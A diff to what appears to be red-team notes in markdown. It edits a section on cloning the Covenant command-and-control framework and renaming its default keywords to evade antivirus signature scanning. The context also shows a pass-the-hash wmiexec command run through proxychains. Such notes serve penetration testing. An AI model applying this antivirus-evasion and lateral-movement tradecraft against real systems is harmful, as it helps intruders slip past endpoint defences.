@@ -334,10 +334,9 @@ proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes 
 ### 1) Covenant modified dropper
 
 First of all we will clone the main Civenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
-(Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below. 
+(Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below:
 
-__Note:__ Please modify the script accordingly with your needs 🚩
- 
+
 ```sh
 sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /home/kali/Desktop/red/Covenant
 
@@ -483,3 +482,8 @@ dotnet build
 dotnet run
 
 ```
+
+__Note:__ Please modify the script accordingly with your needs 🚩
+
+The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default Covenant Listener Profile. 
+
